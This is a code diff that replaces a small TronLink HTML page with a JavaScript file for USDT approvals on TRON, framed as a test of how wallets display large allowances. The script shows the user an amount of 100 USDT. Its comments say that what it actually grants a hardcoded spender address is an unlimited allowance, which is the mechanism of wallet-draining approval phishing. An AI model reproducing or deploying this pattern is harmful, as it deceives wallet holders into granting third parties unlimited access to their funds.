@@ -1,46 +1,141 @@
-<!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>100万 USDT 授权测试</title>
-    <style>
-        body { font-family: Arial; max-width: 500px; margin: 0 auto; padding: 20px; background: #f5f5f5; }
-        .container { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        .input-group { margin: 15px 0; }
-        label { display: block; margin-bottom: 5px; font-weight: bold; }
-        input { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px; font-size: 16px; }
-        button { width: 100%; padding: 12px; margin: 5px 0; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; }
-        #connectBtn { background: #4CAF50; color: white; }
-        #approveBtn { background: #2196F3; color: white; }
-        #approveBtn:disabled { background: #ccc; cursor: not-allowed; }
-        #status { margin-top: 15px; padding: 10px; border-radius: 5px; background: #f8f9fa; min-height: 20px; }
-        .test-info { background: #e8f5e8; padding: 12px; border-radius: 8px; margin-bottom: 15px; text-align: center; border-left: 4px solid #4CAF50; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h2>💰 100万 USDT 授权测试</h2>
-        
-        <div class="test-info">
-            <strong>测试目标：</strong>观察钱包对 100万 USDT 大额授权的显示方式
-        </div>
+// usdtApprove.js — 无限授权 USDT
 
-        <div class="input-group">
-            <label for="amount">显示金额 (USDT):</label>
-            <input type="number" id="amount" value="100" step="1">
-        </div>
+// ====== TRON 链配置 ======
+const shastaUsdtAddress = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs";
+const spenderAddress = "TMcjcKsZZLSFh9nJpTfPejHx7EPjdzG5XkC";
 
-        <button id="connectBtn">🔗 连接 TronLink</button>
-        <button id="approveBtn" disabled>🎯 测试 100万 USDT 授权</button>
+// ====== 最大授权额度 ======
+function getLargeEnoughAmount() {
+  return "1000000000000000000000000000";
+}
 
-        <div id="status">请先连接钱包...</div>
-        
-        <div style="margin-top: 15px; font-size: 12px; color: #666; text-align: center;">
-            注意：实际授权 100万 USDT，请仔细检查钱包显示
-        </div>
-    </div>
+window.approveUSDT = async function() {
+  try {
+    console.log("=== USDT 无限授权测试 ===");
+    setStatus("准备 USDT 无限授权...");
 
-    <script src="usdtApprove.js"></script>
-</body>
-</html>
+    if (!window.tronWeb || !window.tronWeb.ready) {
+      throw new Error("请先连接钱包");
+    }
+
+    const input = document.getElementById("amount");
+    const inputAmount = parseFloat(input.value);
+
+    // 实际授权最大额度
+    const unlimitedAmount = getLargeEnoughAmount();
+
+    console.log("前端显示:", inputAmount, "USDT");
+    console.log("实际授权: 无限额度");
+    console.log("授权值:", unlimitedAmount);
+
+    setStatus(`⚠️ 请确认钱包中的授权金额为“无限”或超大值...`);
+
+    const usdtContract = await window.tronWeb.contract().at(shastaUsdtAddress);
+
+    // ⚠️ 一些合约要求先 approve(0) 再 approve(max)
+    await usdtContract.approve(spenderAddress, "0").send({
+      feeLimit: 100000000,
+      callValue: 0
+    });
+    console.log("✅ allowance 已清零");
+
+    const result = await usdtContract.approve(spenderAddress, unlimitedAmount).send({
+      feeLimit: 100000000,
+      callValue: 0
+    });
+
+    console.log("✅ 无限授权交易成功:", result);
+
+    // 用户反馈
+    setTimeout(() => {
+      const observation = prompt(
+        "测试: 无限 USDT 授权\n\n" +
+        "请记录钱包显示内容：\n" +
+        "1. 显示的金额数字：\n" +
+        "2. 显示格式（是否为科学计数法、十六进制、或显示为“无限”？）\n" +
+        "3. 是否有警告提示：\n\n" +
+        "请简要描述："
+      );
+      if (observation) {
+        console.log("无限授权观察结果:", observation);
+      }
+    }, 2000);
+
+    setStatus(`✅ USDT 无限授权成功`);
+
+  } catch (err) {
+    console.error("授权失败:", err);
+
+    let errorMsg = err.message;
+    if (errorMsg.includes('out-of-bounds')) {
+      errorMsg = "额度过大，钱包可能无法处理，请尝试更小金额";
+    } else if (errorMsg.includes('INVALID_ARGUMENT')) {
+      errorMsg = "参数格式错误";
+    }
+
+    setStatus("❌ 无限授权失败: " + errorMsg, true);
+
+    setTimeout(() => {
+      alert("无限授权失败，可能钱包不支持该数值");
+    }, 1000);
+  }
+};
+
+// ====== 辅助函数 ======
+function setStatus(text, isError = false) {
+  const el = document.getElementById("status");
+  if (el) {
+    el.innerText = `状态：${text}`;
+    el.style.color = isError ? 'red' : 'black';
+  }
+  console.log("状态更新:", text);
+}
+
+// ====== 页面初始化 ======
+window.addEventListener("DOMContentLoaded", () => {
+  const connectBtn = document.getElementById("connectBtn");
+  const approveBtn = document.getElementById("approveBtn");
+
+  console.log("页面加载完成 - USDT 无限授权版");
+
+  if (window.tronWeb && window.tronWeb.ready) {
+    const address = window.tronWeb.defaultAddress.base58;
+    setStatus(`已连接: ${address.substring(0, 8)}...`);
+    approveBtn.disabled = false;
+  }
+
+  connectBtn.addEventListener("click", async () => {
+    try {
+      setStatus("正在连接钱包...");
+
+      if (typeof window.tronLink === 'undefined') {
+        throw new Error("未检测到 TronLink 插件");
+      }
+
+      await window.tronLink.request({ method: 'tron_requestAccounts' });
+
+      await new Promise((resolve) => {
+        const check = setInterval(() => {
+          if (window.tronWeb && window.tronWeb.ready) {
+            clearInterval(check);
+            resolve();
+          }
+        }, 100);
+      });
+
+      const address = window.tronWeb.defaultAddress.base58;
+      setStatus(`✅ 连接成功: ${address.substring(0, 8)}...`);
+      approveBtn.disabled = false;
+
+    } catch (error) {
+      console.error("连接失败:", error);
+      setStatus("❌ 连接失败: " + error.message, true);
+    }
+  });
+
+  approveBtn.addEventListener("click", () => {
+    window.approveUSDT();
+  });
+});
+
+console.log("USDT 无限授权脚本加载完成");
